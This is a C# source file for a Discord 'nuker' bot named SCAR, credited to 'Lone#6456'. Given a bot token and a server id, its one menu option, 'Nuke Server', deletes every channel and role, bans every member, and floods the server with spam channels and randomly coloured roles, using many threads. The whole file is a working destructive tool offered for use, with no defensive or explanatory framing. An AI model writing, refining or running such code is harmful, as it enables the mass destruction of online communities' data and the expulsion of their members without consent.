using System;
using Discord;
using Discord.Net;
using Discord.WebSocket;
using Discord.Commands;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.IO;
using System.Text;


public class Program
{
    public static Task Main(string[] args)
    => new Program().MainAsync();

    private DiscordSocketClient _client;

    public async Task MainAsync()
    {


        var config = new DiscordSocketConfig()
        {
            GatewayIntents = GatewayIntents.All
        };

        _client = new DiscordSocketClient(config);

        _client.Log += Log;
        _client.Ready += OnReady;

        string token;
        Console.Write("Token: ");
        token = Console.ReadLine();




        await _client.LoginAsync(TokenType.Bot, token);

        await _client.StartAsync();
        await Task.Delay(-1);

    }
    private Task Log(LogMessage msg)
    {
        Console.WriteLine(msg.ToString());
        return Task.CompletedTask;


    }
    private Task OnReady()
    {
        Console.SetWindowSize(82, 17);
        static string Logo()
        {
            Console.Clear();

            Console.ForegroundColor = ConsoleColor.DarkMagenta;

            Console.WriteLine(@"
                  ________  ________  ________  ________     
                 |\   ____\|\   ____\|\   __  \|\   __  \    
                 \ \  \___|\ \  \___|\ \  \|\  \ \  \|\  \   
                  \ \_____  \ \  \    \ \   __  \ \   _  _\  
                   \|____|\  \ \  \____\ \  \ \  \ \  \\  \| 
                     ____\_\  \ \_______\ \__\ \__\ \__\\ _\ 
                    |\_________\|_______|\|__|\|__|\|__|\|__|
                     \|_________|                             
    
                                              Made by: Lone#6456
                                              Youtube: fatherAbuser

          (1) Nuke Server      
");

            Console.Write("Choice: ");
            return Console.ReadLine();

        }

        string Choice = Logo();

        if (Choice == "1")
        {
            ulong serverid;
            Console.Write("Guild Id: ");
            string sool = Console.ReadLine();
            serverid = Convert.ToUInt64(sool);
            string channel_name;
            Console.Write("Channel name: ");
            channel_name = Console.ReadLine();
            int amount;
            Console.Write("Amount: ");
            string rool = Console.ReadLine();
            amount = Convert.ToInt32(rool);
            string role_name;
            Console.Write("Role name: ");
            role_name = Console.ReadLine();
            int role_amount;
            Console.Write("Amount: ");
            string tool = Console.ReadLine();
            role_amount = Convert.ToInt32(tool);
            var server = _client.GetGuild(serverid) as SocketGuild;
            var channels = server.Channels;
            var roles = server.Roles;
            var members = server.Users;

            new Thread(() =>
            {
                new Thread(() =>
                {
                    foreach (var channel in channels)
                    {
                        new Thread(() =>
                        {
                            channel.DeleteAsync();
                        }).Start();
                    };
                    foreach (var member in members)
                    {
                        new Thread(() =>
                        {
                            member.BanAsync();
                        }).Start();
                    };
                    for (int i = 0; i < amount; i++)
                    {
                        new Thread(() =>
                        {
                            server.CreateTextChannelAsync(channel_name);
                        }).Start();
                    };
                    foreach (var role in roles)
                    {
                        new Thread(() =>
                        {
                            role.DeleteAsync();
                        }).Start();
                    };
                    for (int i = 0; i < role_amount; i++)
                    {
                        var ran = new Random();
                        new Thread(() =>
                        {
                            server.CreateRoleAsync(name: role_name, color: new Color(ran.Next(256), ran.Next(256), ran.Next(256)));
                        }).Start();
                    };
                    
                }).Start();
            }).Start();
            Logo();
        }

        return Task.CompletedTask;
    }
}
